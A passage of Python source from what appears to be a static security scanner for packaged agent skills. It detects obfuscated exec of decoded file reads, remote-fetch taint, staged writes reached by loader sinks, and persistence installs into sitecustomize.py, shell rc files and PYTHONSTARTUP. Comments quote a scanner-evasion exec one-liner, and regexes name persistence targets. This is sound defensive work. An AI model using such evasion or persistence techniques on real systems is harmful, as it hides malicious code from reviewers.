            return [_containment_push(_containment_as_path(r), [_CONTAINMENT_SAFE_MARK])
                    for r in _containment_ev(it.func.value, env, visited)]
    if isinstance(it, ast.Name):
        out = []
        for v in _containment_ev(it, env, visited):
            if isinstance(v, _ContainmentSeq):
                for e in v.elts:
                    out += list(e)
            else:
                return [_ContainmentOpq("runtime", "loop over a computed iterable")]
        return out
    return [_ContainmentOpq("runtime", "loop over a computed iterable")]


# ---- top-level predicates ---------------------------------------------------------
_CONTAINMENT_READ_ATTRS = {"read", "readline"}


def _containment_classify_path(node, ctx):
    env = _ContainmentEnv(ctx, ctx.scope_of(node))
    try:
        alts = _containment_ev(node, env)
        if not alts:
            return _CONTAINMENT_NOT_ANCHORED, "no value reaches the read (every alternative is dead)"
        worst = (_CONTAINMENT_BOUNDED, "")
        for a in alts:
            v = _containment_verdict(_containment_as_path(a), ctx.depth_known)
            if _CONTAINMENT_RANK[v[0]] > _CONTAINMENT_RANK[worst[0]]:
                worst = v
        return worst
    except Exception as e:  # noqa: BLE001 -- fail-closed on ANY internal error, not just Budget
        return _CONTAINMENT_ESCAPES, f"analysis budget/error exhausted ({e}) -- fail-closed"


def _containment_open_paths(h, ctx, env, visited=frozenset(), hops=0):
    """Every path expression the file handle *h* may have been opened on, or None when
    *h* is not positively a builtin open() handle."""
    if hops > _CONTAINMENT_MAX_HOPS:
        raise _ContainmentBudget("handle hops")
    if isinstance(h, ast.Call):
        d = ctx.canon_func(h.func, env)
        if d in ("builtins.open", "io.open", "codecs.open"):
            if h.args and not isinstance(h.args[0], ast.Starred):
                return [(h.args[0], env)]
            for kw in h.keywords:
                if kw.arg == "file" or (d == "codecs.open" and kw.arg == "filename"):
                    return [(kw.value, env)]
            return None
        if isinstance(h.func, ast.Attribute) and h.func.attr == "open" and not h.args:
            return [(h.func.value, env)]   # Path(...).open()
        return None
    if isinstance(h, ast.IfExp):
        a = _containment_open_paths(h.body, ctx, env, visited, hops + 1)
        b = _containment_open_paths(h.orelse, ctx, env, visited, hops + 1)
        return None if a is None or b is None else a + b
    if isinstance(h, ast.BoolOp):
        out = []
        for v in h.values:
            r = _containment_open_paths(v, ctx, env, visited, hops + 1)
            if r is None:
                return None
            out += r
        return out
    if isinstance(h, ast.Name):
        defs = _containment_lookup(h, env, visited)
        if not defs:
            return None
        out = []
        for d, denv in defs:
            if d.kind in ("with", "assign") and d.node is not None:
                r = _containment_open_paths(d.node, ctx, denv, visited, hops + 1)
                if r is None:
                    return None
                out += r
            else:
                return None
        return out
    return None


def _containment_classify_decode(decode_call, ctx):
    """Verdict for one `<recv>.decode(...)` call: is <recv> a read of a positively
    artifact-bounded file?"""
    if ctx.fail_closed_reason:
        return _CONTAINMENT_NOT_ANCHORED, f"fail-closed: {ctx.fail_closed_reason}"
    recv = decode_call.func.value
    if not (isinstance(recv, ast.Call) and isinstance(recv.func, ast.Attribute)
            and recv.func.attr in _CONTAINMENT_READ_ATTRS):
        return _CONTAINMENT_NOT_ANCHORED, "decode receiver is not a recognized file read"
    env = _ContainmentEnv(ctx, ctx.scope_of(decode_call))
    try:
        paths = _containment_open_paths(recv.func.value, ctx, env)
    except Exception as e:  # noqa: BLE001 -- fail-closed on ANY internal error, not just Budget
        return _CONTAINMENT_ESCAPES, f"handle resolution budget/error exhausted ({e})"
    if paths is None:
        return _CONTAINMENT_NOT_ANCHORED, "handle is not positively a builtin open() handle"
    worst = (_CONTAINMENT_BOUNDED, "")
    for p, penv in paths:
        v = _containment_classify_path(p, ctx) if penv.params == {} else _containment_classify_in(p, penv)
        if _CONTAINMENT_RANK[v[0]] > _CONTAINMENT_RANK[worst[0]]:
            worst = v
    return worst


def _containment_classify_in(node, env):
    try:
        alts = _containment_ev(node, env)
        worst = (_CONTAINMENT_BOUNDED, "")
        for a in alts or [_ContainmentOpq("unrecognized", "dead")]:
            v = _containment_verdict(_containment_as_path(a), env.ctx.depth_known)
            if _CONTAINMENT_RANK[v[0]] > _CONTAINMENT_RANK[worst[0]]:
                worst = v
        return worst
    except Exception as e:  # noqa: BLE001 -- fail-closed on ANY internal error, not just Budget
        return _CONTAINMENT_ESCAPES, f"budget/error ({e})"


# ---- public wrappers: the B-752/B-850 call sites below consume these -------------
def _decode_call_artifact_verdict(
    node: ast.Call, tree: ast.AST, relpath: str = ""
) -> tuple[str, str]:
    """B-850 verdict (+ reason) for one `<recv>.decode(...)` call's receiver path --
    BOUNDED / UNPROVEN / ESCAPES / NOT_ANCHORED. See the module comment above the
    "B-850: artifact-containment ALLOWLIST recognizer" banner for the full design."""
    ctx = _ContainmentCtx(tree, relpath)
    return _containment_classify_decode(node, ctx)


def _decode_call_is_artifact_exempt(node: ast.Call, tree: ast.AST, relpath: str = "") -> bool:
    """True when *node*'s B-850 verdict is BOUNDED or UNPROVEN -- i.e. never proven to
    escape the artifact, so the crit this call would otherwise contribute to is excused.
    BOUNDED is excused silently; UNPROVEN is excused too but disclosed via the
    ARTIFACT_READ_UNPROVEN WARN emitted at the call site that classified it (see
    `_containment_unproven_decode_findings`, called once from `analyze_python`)."""
    verdict, _reason = _decode_call_artifact_verdict(node, tree, relpath)
    return verdict in (_CONTAINMENT_BOUNDED, _CONTAINMENT_UNPROVEN)


def _containment_unproven_decode_findings(
    node: ast.AST, tree: ast.AST, relpath: str = "", path_aliases: set | None = None
) -> list[tuple[int, str]]:
    """(lineno, reason) for every decode-shaped call in *node* whose B-850 verdict is
    UNPROVEN. Mirrors the same walk/skip logic as
    `_decode_signal_is_only_artifact_relative_reads` (join()-vs-decode disambiguation,
    the XOR bail) so the two agree on which calls are "the" decode call(s); only
    meaningful to consult once that function has already confirmed the subtree is
    exempt (no ESCAPES/NOT_ANCHORED present) -- used to disclose the WARN-only
    ARTIFACT_READ_UNPROVEN finding at the same call site (B394, checks/_vet.py)."""
    if _has_xor_decode(node):
        return []
    out: list[tuple[int, str]] = []
    for n in ast.walk(node):
        if not _is_decode_call(n) or _is_path_join_call(n, path_aliases):
            continue
        nf = n.func
        if not (isinstance(nf, ast.Attribute) and nf.attr == "de" + "code"):
            continue
        verdict, reason = _decode_call_artifact_verdict(n, tree, relpath)
        if verdict == _CONTAINMENT_UNPROVEN:
            out.append((getattr(n, "lineno", 0), reason))
    return out


def _decode_signal_is_only_artifact_relative_reads(
    node: ast.AST, tree: ast.AST, relpath: str = "", path_aliases: set | None = None
) -> bool:
    """True when EVERY decode-shaped call `_subtree_has_decode` would match inside
    *node* is a bare `.decode(...)` on a local file read whose B-850 verdict
    (`_decode_call_is_artifact_exempt`) is BOUNDED or UNPROVEN -- never proven to
    escape the artifact -- and nothing stronger -- a real content-hiding primitive
    (base64/hex/b85/zlib/... in _DECODE_FUNCS), an XOR-built sequence, or a
    `.fromhex(...)`/`.join(...)` call -- is present anywhere in the subtree. False
    (never exempt) if no decode-shaped call is found at all, so this must only be
    consulted when `_subtree_has_decode` is already True.

    `tree` (renamed from B-752's `scope`, B-850): the B-850 recognizer resolves a
    node's lexical scope itself via its own parent-pointer map, so it needs the whole
    module tree rather than the caller's best-guess enclosing scope.
    """
    if _has_xor_decode(node):
        return False
    found_any = False
    for n in ast.walk(node):
        if not _is_decode_call(n):
            continue
        # B-753: `os.path.join(...)` matches `_is_decode_call` only because "join" is in
        # `_DECODE_ATTRS` for `"".join(parts)`'s sake. It is not a content-hiding
        # primitive, so it must neither count as one nor end this loop -- doing so bailed
        # before the genuine `.decode()` in the same expression was ever examined, which
        # made the exemption UNREACHABLE for the inline `setup.py` idiom while leaving the
        # `with`-block spelling of the same read exempt. Skipped, not treated as evidence.
        #
        # WHY THE RECEIVER TEST HAS TO BE STRICT, stated here because this is the line
        # that makes it matter. It is true that a skip alone absolves nothing -- the loop
        # returns `found_any`, which only a genuine artifact-relative `.decode()` sets --
        # and it is tempting to conclude that dressing a string join as a path join buys
        # an attacker nothing. That does not follow, and an adversarial pass proved it:
        # PAIR the disguised join with a real in-artifact read in the SAME expression and
        # the genuine half satisfies `found_any` while the skip carries the payload
        # through. `exec(open(join(dirname(__file__), "v.py")).read().decode() +
        # fake.path.join(fragments))` was absolved. So the skip is only ever as safe as
        # the receiver test is strict, and the receiver test is import-bound for that
        # reason, not for tidiness.
        if _is_path_join_call(n, path_aliases):
            continue
        found_any = True
        nf = n.func
        if isinstance(nf, ast.Name):
            return False  # a real _DECODE_FUNCS primitive called bare, e.g. b64decode(x)
        if not (isinstance(nf, ast.Attribute) and nf.attr == "de" + "code"):
            return False  # fromhex/join, or a _DECODE_FUNCS primitive as a method
        if not _decode_call_is_artifact_exempt(n, tree, relpath):
            return False
    return found_any


def _exec_sink_taint_is_only_artifact_relative_decode(
    arg_node: ast.AST,
    tainted: set[str],
    tree: ast.AST,
    relpath: str = "",
    path_aliases: tuple | None = None,
) -> bool:
    """True when every TAINTED NAME `_call_args_tainted` would match inside
    *arg_node*, and every inline external-source call `_call_args_tainted_for_
    exec_sink` (B-916) would match there instead, is explained by a decode-shaped
    file read the B-850 recognizer exempts (`_decode_call_is_artifact_exempt` --
    BOUNDED or UNPROVEN) -- and nothing else.

    B-752 (TT5 follow-up). `_external_tainted_names` treats ANY `open()`/`.read()`
    call as an external source -- right for TT5's general case, since a file
    genuinely read from outside the artifact IS external input, and df4d7b1
    correctly closed a real gap by propagating that taint through `with`/`for`
    bindings, not just assignment. But it has no exception for a skill reading
    its own bundled sibling file, so the canonical `setup.py` idiom --
    `with open(join(dirname(__file__), "v.py")) as fh: exec(fh.read().decode())`
    -- taints `fh` exactly like a network response would, and TT5_CMD_INJECTION
    escalated to crit on code that reads and execs nothing but its own artifact.

    Reuses `_decode_signal_is_only_artifact_relative_reads` -- the SAME predicate
    OBFUSCATED_EXEC already trusts for this idiom -- but that predicate only
    examines decode-SHAPED calls; it says nothing about a genuinely tainted name
    riding along elsewhere in the same expression, e.g.
    `exec(fh.read().decode() + attacker_supplied)`. So the tainted names this
    argument actually contributes are compared against only the names the
    decode call's OWN receiver resolves to -- a name tainted for any other
    reason is not in that covered set, and the caller keeps convicting.

    B-916: the SAME idiom written with no intermediate variable at all --
    `exec(open(join(dirname(__file__), "v.py")).read().decode(), {})`, all one
    expression -- has no tainted NAME in it whatsoever, only the inline `open()`/
    `.read()` source call `_call_args_tainted_for_exec_sink` now also recognizes.
    `tainted_here` alone would then be empty and the OLD early return (`if not
    tainted_here: return False`) would wrongly convict the identical, already-benign
    idiom merely for being spelled inline. The name-based accounting below is
    unchanged when a name IS present; when the arg's only taint is inline, the same
    "every decode call's receiver resolves to a shipped sibling file, and nothing
    else contributes taint" question is instead asked of every node OUTSIDE each
    covered receiver's own subtree -- an uncovered inline source there (a second,
    unrelated network read alongside the legitimate one) still convicts, exactly
    like the mixed-name case above.
    """
    tainted_here = _names_in(arg_node) & tainted
    has_inline_source = _value_is_tainted_source(arg_node, tainted)
    if not tainted_here and not has_inline_source:
        return False
    if not _subtree_has_decode(arg_node):
        return False
    if not _decode_signal_is_only_artifact_relative_reads(
        arg_node, tree, relpath, path_aliases
    ):
        return False
    covered: set[str] = set()
    covered_ids: set[int] = set()
    for n in ast.walk(arg_node):
        if not _is_decode_call(n) or _is_path_join_call(n, path_aliases):
            continue
        nf = n.func
        if isinstance(nf, ast.Attribute) and nf.attr == "de" + "code":
            if _decode_call_is_artifact_exempt(n, tree, relpath):
                covered |= _names_in(nf.value)
                covered_ids |= {id(x) for x in ast.walk(nf.value)}
    if not (tainted_here <= covered):
        return False
    if not has_inline_source:
        return True
    return not _has_uncovered_inline_source(arg_node, tainted, covered_ids)


def _has_uncovered_inline_source(
    arg_node: ast.AST, tainted: "set[str]", covered_ids: "set[int]"
) -> bool:
    """True when *arg_node* contains an inline external-source call (the same
    vocabulary `_value_is_tainted_source` recognizes: `_is_external_source_call`,
    `os.getenv`/`environ.get`, a tool-result-shaped call) OUTSIDE every node id in
    *covered_ids* -- i.e. taint `_exec_sink_taint_is_only_artifact_relative_decode`'s
    decode-receiver walk has not already vetted as an artifact-relative read.
    Deliberately does not descend into a covered node's own subtree: the receiver's
    own `open()`/`.read()` calls are exactly the source the caller just proved safe,
    and re-matching them here would convict the very idiom this exemption exists for.
    """
    stack = [arg_node]
    while stack:
        n = stack.pop()
        if id(n) in covered_ids:
            continue
        if isinstance(n, ast.Call):
            f = n.func
            if (
                (isinstance(f, ast.Attribute) and f.attr == "getenv" and _attr_base(f.value) == "os")
                or (isinstance(f, ast.Attribute) and f.attr == "get" and _attr_base(f.value) == "environ")
                or _is_external_source_call(n)
                or _is_tool_result_call(n)
            ):
                return True
        stack.extend(ast.iter_child_nodes(n))
    return False


# F-177/B375: sitecustomize.py/usercustomize.py + PYTHONSTARTUP auto-execution
# persistence INSTALL, resolved at AST function-scope precision — the persistence-
# axis-feeding twin of checks/_content.py's check_python_runtime_persist_install
# (B335), which already recognizes this exact shape via a whole-file regex + a
# character-proximity window but carries no AST0x rule of its own (see catalog.py's
# B375 comment and dossier.py's _AXIS_BY_ID for why that matters).
#
# Mechanism A: within ONE function — a site.getsitepackages()/getusersitepackages()
# call, a sitecustomize.py/usercustomize.py string constant (the install TARGET), and
# a write/append-mode open() call.
# Mechanism B: within ONE function — a shell-rc path string constant (.bashrc/.zshrc/
# .bash_profile/.profile/.zprofile), a PYTHONSTARTUP=-shaped string constant (an
# assignment, never a bare mention — the same discriminator B335 uses), and a
# write/append-mode open() call.
#
# "Same function scope" (ast.walk(fn), not the whole file) is the deliberate boundary
# — the same co-occurrence precision as `_function_has_history_file_read` above — so a
# skill that merely INTROSPECTS site.getsitepackages() in one function while an
# unrelated function elsewhere in the same file happens to open() some other,
# unrelated file for writing does not convict. Dev tooling / venv doctors are exactly
# the first half with no second half anywhere in the file (fixtures/
# clean_b335_devtooling), and a doc/example skill never reaches this at all (its
# fenced examples live in a .md file, which the Python collector never feeds here).
_AST_SITECUSTOMIZE_TARGET_RE = re.compile(r"(?:site|user)customize\.py", re.IGNORECASE)
_AST_SHELL_RC_TARGET_RE = re.compile(r"\.(?:bashrc|zshrc|bash_profile|profile|zprofile)\b")
_AST_PYTHONSTARTUP_ASSIGN_RE = re.compile(r"PYTHONSTARTUP[\"']?\]?\s*=")


def _is_write_or_append_open_call(node: ast.AST) -> bool:
    """True for `open(path, "w"/"wb"/"a"/"ab")` (positional or `mode=` keyword) — the
    AST twin of checks/_content.py's `_WRITE_MODE_OPEN_RE` (same `[wa]b?` shape, so a
    read-only open() or an unrecognized mode like "w+"/"x" never matches either)."""
    if not isinstance(node, ast.Call) or not _is_open_call(node):
        return False
    mode = _literal_str(node.args[1]) if len(node.args) > 1 else ""
    for kw in node.keywords:
        if kw.arg == "mode":
            mode = _literal_str(kw.value)
    if not mode:
        return False
    return mode.rstrip("b") in ("w", "a")


def _is_sitepackages_lookup_call(node: ast.AST) -> bool:
    """True for a call to `getsitepackages()`/`getusersitepackages()` under any base
    name — the AST match works on the attribute/name alone and needs no literal
    `site.` prefix text the way a regex would."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    name = f.attr if isinstance(f, ast.Attribute) else (f.id if isinstance(f, ast.Name) else "")
    return name in ("getsitepackages", "getusersitepackages")


def _bare_string_stmt_constant_ids(fn: ast.AST) -> set:
    """id() of every Constant that is the WHOLE value of a bare string-literal
    expression statement anywhere in *fn* -- a docstring, or a rarer mid-function
    string used as an inline comment.

    C-135 adversarial finding (F-177/B375): a docstring that DISCLAIMS an install
    ("Does not touch sitecustomize.py -- read-only") still contains the target
    filename as a string, and combined with an unrelated write elsewhere in the same
    function, false-WARNed before this exclusion -- mirrors B335's own disclaiming-
    docstring/comment carve-out (checks/_content.py), ported to the AST layer. Prose
    that merely MENTIONS a filename is not the same as USING it as a real value: a
    functioning install always needs the filename to appear inside an expression
    actually in use (an assignment RHS, a call argument, an f-string), never merely
    as an orphaned bare string statement — so excluding these loses no true
    positive."""
    ids: set = set()
    for node in ast.walk(fn):
        if (
            isinstance(node, ast.Expr)
            and isinstance(node.value, ast.Constant)
            and isinstance(node.value.value, str)
        ):
            ids.add(id(node.value))
    return ids


def _function_has_sitecustomize_install(fn: ast.AST) -> bool:
    """Mechanism A (F-177/B375) — see the module comment above
    `_AST_SITECUSTOMIZE_TARGET_RE` for the full co-occurrence rationale."""
    nodes = list(ast.walk(fn))
    prose_ids = _bare_string_stmt_constant_ids(fn)
    if not any(_is_sitepackages_lookup_call(n) for n in nodes):
        return False
    if not any(
        isinstance(n, ast.Constant)
        and isinstance(n.value, str)
        and id(n) not in prose_ids
        and _AST_SITECUSTOMIZE_TARGET_RE.search(n.value)
        for n in nodes
    ):
        return False
    return any(_is_write_or_append_open_call(n) for n in nodes)


def _function_has_pythonstartup_shell_rc_install(fn: ast.AST) -> bool:
    """Mechanism B (F-177/B375) — see the module comment above
    `_AST_SHELL_RC_TARGET_RE` for the full co-occurrence rationale."""
    nodes = list(ast.walk(fn))
    prose_ids = _bare_string_stmt_constant_ids(fn)
    if not any(
        isinstance(n, ast.Constant)
        and isinstance(n.value, str)
        and id(n) not in prose_ids
        and _AST_SHELL_RC_TARGET_RE.search(n.value)
        for n in nodes
    ):
        return False
    if not any(
        isinstance(n, ast.Constant)
        and isinstance(n.value, str)
        and id(n) not in prose_ids
        and _AST_PYTHONSTARTUP_ASSIGN_RE.search(n.value)
        for n in nodes
    ):
        return False
    return any(_is_write_or_append_open_call(n) for n in nodes)


def _persist_install_function_findings(tree: ast.AST) -> list[tuple[int, str, str]]:
    """Scan every function scope in *tree* for mechanism A or B (F-177/B375).

    Returns (lineno, mechanism, funcname) for each function whose OWN scope trips
    either mechanism — mirrors `_telemetry_collector_funcnames`'s per-function walk
    above. A function that somehow trips both mechanisms reports only A (mechanism
    identity is informational evidence text, not a distinct verdict)."""
    hits: list[tuple[int, str, str]] = []
    for node in ast.walk(tree):
        if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        if _function_has_sitecustomize_install(node):
            hits.append((getattr(node, "lineno", 0), "A", node.name))
        elif _function_has_pythonstartup_shell_rc_install(node):
            hits.append((getattr(node, "lineno", 0), "B", node.name))
    return hits


# ── B-917: loader sinks (runpy/importlib/zipimport execute a FILE by
# PATH, not a name reference) and staged-import correlation (a write followed by an
# import whose search path resolves to the same location). Both reuse shippedexec's
# shared location resolver (`_FileFacts.locate()` / `loc_eq()` -- see shippedexec.py's
# `Loc` docstring) instead of the ad hoc, spelling-keyed predicates the pre-4.3.0
# branch used for this ticket: the root-cause fix b917-design.md describes is that a
# verdict must be decided by LOCATION EQUALITY between the write and the read, never
# by whether one side's spelling "looks foreign" (a predicate over one side of a pair
# cannot answer a question about both sides). Scoped to ONE file at a time: this pass
# does not correlate a write in one artifact file against an import in another
# (deviation from b917-design.md section D's "artifact-wide" cache, recorded in the
# B-917 Pulse comment).
# ─────────────────────────────────────────────────────────────────────────────────────

_B917_LOADER_DIRECT = frozenset({"runpy.run_path", "imp.load_source"})
_B917_SPEC_CTOR = "importlib.util.spec_from_file_location"
_B917_LOADER_CLASSES = frozenset({
    "importlib.machinery.SourceFileLoader",
    "importlib.machinery.SourcelessFileLoader",
    "importlib.machinery.ExtensionFileLoader",
})
_B917_ZIP_CTOR = "zipimport.zipimporter"
_B917_LOADER_RUN_METHODS = frozenset({"exec_module", "load_module"})
_B917_MODULE_IMPORT_CALLS = frozenset({"importlib.import_module", "runpy.run_module"})
# B-927: a bare (aliased-import) remote fetch `_expr_reads_remote` cannot see, because
# it only recognises the ATTRIBUTE-call shape (`urllib.request.urlopen(...)`), not a
# name bound by `from urllib.request import urlopen`.
_B917_REMOTE_FUNCS = frozenset({"urllib.request.urlopen"})
_B917_WRITE_MODE_RE = re.compile(r"^(?=.*[wax])[rwaxbt+]{1,4}$")


def _b917_target_names(t: ast.AST):
    """Every Name bound by an assignment/for/with TARGET (Name/Tuple/List/Starred)."""
    if isinstance(t, ast.Name):
        yield t.id
    elif isinstance(t, (ast.Tuple, ast.List)):
        for e in t.elts:
            yield from _b917_target_names(e)
    elif isinstance(t, ast.Starred):
        yield from _b917_target_names(t.value)


def _b917_remote_tainted_names(tree: ast.AST, facts: "_shippedexec._FileFacts") -> set:
    """`_remote_fetch_tainted_names`, extended (B-917) two ways: a bare `urlopen`
    reached through `from urllib.request import urlopen` (B-927 -- the existing
    helper only recognises the attribute-call spelling), and one more propagation
    hop through a `for` target iterating a tainted response's streaming reader
    (`for chunk in r.iter_content(): ...`)."""
    names = set(_remote_fetch_tainted_names(tree))
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    loops = [n for n in ast.walk(tree) if isinstance(n, (ast.For, ast.AsyncFor))]
    for _ in range(6):
        changed = False
        for a in assigns:
            bare_remote = any(
                isinstance(n, ast.Call) and facts.dotted(n.func) in _B917_REMOTE_FUNCS
                for n in ast.walk(a.value)
            )
            if not (bare_remote or _expr_reads_remote(a.value) or (_names_in(a.value) & names)):
                continue
            for t in a.targets:
                for nm in _b917_target_names(t):
                    if nm not in names:
                        names.add(nm)
                        changed = True
        for f in loops:
            if not (_expr_reads_remote(f.iter) or (_names_in(f.iter) & names)):
                continue
            for nm in _b917_target_names(f.target):
                if nm not in names:
                    names.add(nm)
                    changed = True
        if not changed:
            break
    return names


def _b917_has_decode(node: ast.AST, facts) -> bool:
    """`_subtree_has_decode`, minus its one false-positive for THIS caller:
    `_DECODE_ATTRS` includes bare `"join"` (the `"".join(chunks)` reassembly idiom),
    which also matches the everyday `os.path.join(...)`/`posixpath.join(...)` every
    path expression here is built from. A path-module join is never a decode call
    regardless of its arguments."""
    for n in ast.walk(node):
        if isinstance(n, ast.Call):
            if isinstance(n.func, ast.Name) and n.func.id in _DECODE_FUNCS:
                return True
            if (
                isinstance(n.func, ast.Attribute) and n.func.attr in _DECODE_ATTRS
                and not (n.func.attr == "join"
                         and facts.dotted(n.func) in ("os.path.join", "posixpath.join"))
            ):
                return True
    return _has_xor_decode(node)


def _b917_content_tainted(node: "ast.AST | None", remote_names: set, facts) -> bool:
    """Is *node* (a write call's content argument, or a loader's path argument)
    remote-fetched or decode-tainted -- B-917 section D's content-source test."""
    if node is None:
        return False
    if _b917_has_decode(node, facts):
        return True
    if _expr_reads_remote(node):
        return True
    if any(
        isinstance(n, ast.Call) and facts.dotted(n.func) in _B917_REMOTE_FUNCS
        for n in ast.walk(node)
    ):
        return True
    return bool(_names_in(node) & remote_names)


def _b917_write_mode(mode_node: "ast.AST | None", facts, scope) -> "str | None":
    lit = facts.literal(mode_node, scope) if mode_node is not None else "r"
    if lit is None or not _B917_WRITE_MODE_RE.match(lit):
        return None
    return lit


def _b917_open_write_loc(open_call: ast.Call, facts, scope):
    """The `Loc` a write-mode `open()`/`io.open()` call writes to, or None."""
    if not isinstance(open_call, ast.Call) or any(
        isinstance(a, ast.Starred) for a in open_call.args
    ):
        return None
    d = facts.dotted(open_call.func)
    if d not in ("builtins.open", "io.open"):
        return None
    kwargs = {k.arg: k.value for k in open_call.keywords if k.arg}
    path_node = open_call.args[0] if open_call.args else kwargs.get("file")
    mode_node = open_call.args[1] if len(open_call.args) > 1 else kwargs.get("mode")
    if path_node is None or _b917_write_mode(mode_node, facts, scope) is None:
        return None
    return facts.locate(path_node, scope)


def _b917_staged_writes(tree: ast.AST, facts, remote_names: set) -> list:
    """[(node, Loc, tainted)] -- every write this file makes whose content is
    remote-fetched or decode-tainted (B-917 section D). `node` is the write call
    itself, kept for the eventual finding's line number."""
    out: list = []

    def add_from_handle(name: str, region: ast.AST, loc) -> None:
        for sub in ast.walk(region):
            if (
                isinstance(sub, ast.Call) and isinstance(sub.func, ast.Attribute)
                and sub.func.attr in ("write", "writelines")
                and isinstance(sub.func.value, ast.Name) and sub.func.value.id == name
            ):
                content = sub.args[0] if sub.args else None
                out.append((sub, loc, _b917_content_tainted(content, remote_names, facts)))

    for node in ast.walk(tree):
        scope = facts.scope_of(node)
        if scope is None:
            continue
        if (
            isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
            and node.func.attr in ("write", "writelines")
            and isinstance(node.func.value, ast.Call)
        ):
            # inline: open(p, mode).write(data)
            loc = _b917_open_write_loc(node.func.value, facts, scope)
            if loc is not None:
                content = node.args[0] if node.args else None
                out.append((node, loc, _b917_content_tainted(content, remote_names, facts)))
        elif isinstance(node, ast.With):
            for item in node.items:
                if not (
                    isinstance(item.context_expr, ast.Call)
                    and isinstance(item.optional_vars, ast.Name)
                ):
                    continue
                loc = _b917_open_write_loc(item.context_expr, facts, scope)
                if loc is not None:
                    add_from_handle(item.optional_vars.id, node, loc)
        elif (
            isinstance(node, ast.Assign) and isinstance(node.value, ast.Call)
            and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name)
        ):
            loc = _b917_open_write_loc(node.value, facts, scope)
            if loc is not None:
                add_from_handle(node.targets[0].id, scope, loc)
        elif (
            isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
            and node.func.attr in ("write_bytes", "write_text") and not node.keywords
        ):
            loc = facts.locate(node.func.value, scope)
            if loc is not None:
                content = node.args[0] if node.args else None
                out.append((node, loc, _b917_content_tainted(content, remote_names, facts)))
        elif (
            isinstance(node, ast.Call) and facts.dotted(node.func) == "shutil.copyfileobj"
            and len(node.args) >= 2
        ):
            dst = node.args[1]
            loc = None
            if isinstance(dst, ast.Call):
                loc = _b917_open_write_loc(dst, facts, scope)
            elif isinstance(dst, ast.Name):
                rec = facts.sole(dst.id, scope)
                if rec is not None and rec[0] == "assign" and isinstance(rec[1], ast.Call):
                    loc = _b917_open_write_loc(rec[1], facts, scope)
            if loc is not None:
                out.append((node, loc, _b917_content_tainted(node.args[0], remote_names, facts)))
        elif (
            isinstance(node, ast.Call)
            and facts.dotted(node.func) == "urllib.request.urlretrieve"
            and len(node.args) >= 2
        ):
            loc = facts.locate(node.args[1], scope)
            if loc is not None:
                out.append((node, loc, True))  # remote by construction
    return out


def _b917_reaching_call(name_expr, facts, scope, want_dotted, depth: int = 0):
    """Follow a `sole()` chain of Name bindings to the Call it ultimately names
    (bounded), optionally requiring `dotted(call.func) == want_dotted`."""
    if depth > 6:
        return None
    if isinstance(name_expr, ast.Call):
        call = name_expr
    elif isinstance(name_expr, ast.Name):
        rec = facts.sole(name_expr.id, scope)
        if rec is None or rec[0] != "assign":
            return None
        return _b917_reaching_call(rec[1], facts, scope, want_dotted, depth + 1)
    else:
        return None
    if want_dotted is not None and facts.dotted(call.func) != want_dotted:
        return None
    return call


def _b917_loader_call(node: ast.AST, facts):
    """(kind, path_node) for a B-917 loader-sink call, or None. `kind` is "direct"
    (runpy.run_path / imp.load_source), "spec" (`<spec>.loader.exec_module`/
    `.load_module` reached from a `spec_from_file_location`), "class" (the same for
    an `importlib.machinery.*Loader` instance) or "zip" (a `zipimporter` instance)."""
    if not isinstance(node, ast.Call):
        return None
    d = facts.dotted(node.func)
    if d in _B917_LOADER_DIRECT:
        idx = 0 if d == "runpy.run_path" else 1
        if len(node.args) > idx and not isinstance(node.args[idx], ast.Starred):
            return ("direct", node.args[idx])
        return None
    if not isinstance(node.func, ast.Attribute) or node.func.attr not in _B917_LOADER_RUN_METHODS:
        return None
    recv = node.func.value
    scope = facts.scope_of(node)
    if scope is None:
        return None
    if isinstance(recv, ast.Attribute) and recv.attr == "loader":
        spec_call = _b917_reaching_call(recv.value, facts, scope, _B917_SPEC_CTOR)
        if spec_call is not None and len(spec_call.args) > 1 and not any(
            isinstance(a, ast.Starred) for a in spec_call.args[:2]
        ):
            return ("spec", spec_call.args[1])
        return None
    ctor_call = _b917_reaching_call(recv, facts, scope, None)
    if ctor_call is not None:
        cd = facts.dotted(ctor_call.func)
        if cd in _B917_LOADER_CLASSES and len(ctor_call.args) > 1:
            return ("class", ctor_call.args[1])
        if cd == _B917_ZIP_CTOR and ctor_call.args:
            return ("zip", ctor_call.args[0])
    return None


def _b917_attr_path(expr: "ast.AST | None") -> "str | None":
    """Dotted name of a Name/Attribute chain, ignoring `ctx` (so a STORE target like
    `sys.path = [...]` is recognised too, which `_FileFacts.dotted()` -- Load-only,
    by the B-638 proof's own design -- cannot be asked). `sys`/`site` are never
    usefully import-aliased, so no import-table lookup is needed here."""
    if isinstance(expr, ast.Name):
        return expr.id
    if isinstance(expr, ast.Attribute):
        base = _b917_attr_path(expr.value)
        return f"{base}.{expr.attr}" if base else None
    return None


def _b917_search_dirs(tree: ast.AST, facts):
    """(definite search-dir Locs, saw-an-unresolvable-member: bool) -- B-917 section
    C's search set S, scoped to this one file. `FILE` (the file's own directory) is
    added by the caller unconditionally; this only collects explicit sys.path/
    site.addsitedir mutations."""
    dirs: list = []
    unknown = False
    syspath_aliases = {
        n.targets[0].id
        for n in ast.walk(tree)
        if isinstance(n, ast.Assign) and len(n.targets) == 1
        and isinstance(n.targets[0], ast.Name) and facts.dotted(n.value) == "sys.path"
    }

    def collect_elts(value: "ast.AST | None", scope) -> None:
        nonlocal unknown
        if isinstance(value, (ast.List, ast.Tuple)):
            for e in value.elts:
                loc = facts.locate(e, scope)
                if loc is not None:
                    dirs.append(loc)
                else:
                    unknown = True
        else:
            unknown = True

    for node in ast.walk(tree):
        scope = facts.scope_of(node)
        if scope is None:
            continue
        if isinstance(node, ast.Call):
            d = facts.dotted(node.func)
            if d == "sys.path.insert" and len(node.args) >= 2:
                loc = facts.locate(node.args[1], scope)
                if loc is not None:
                    dirs.append(loc)
                else:
                    unknown = True
            elif d in ("sys.path.append", "site.addsitedir") and node.args:
                loc = facts.locate(node.args[0], scope)
                if loc is not None:
                    dirs.append(loc)
                else:
                    unknown = True
            elif d == "sys.path.extend" and node.args:
                collect_elts(node.args[0], scope)
            elif (
                isinstance(node.func, ast.Attribute)
                and node.func.attr in ("insert", "append", "extend")
                and isinstance(node.func.value, ast.Name)
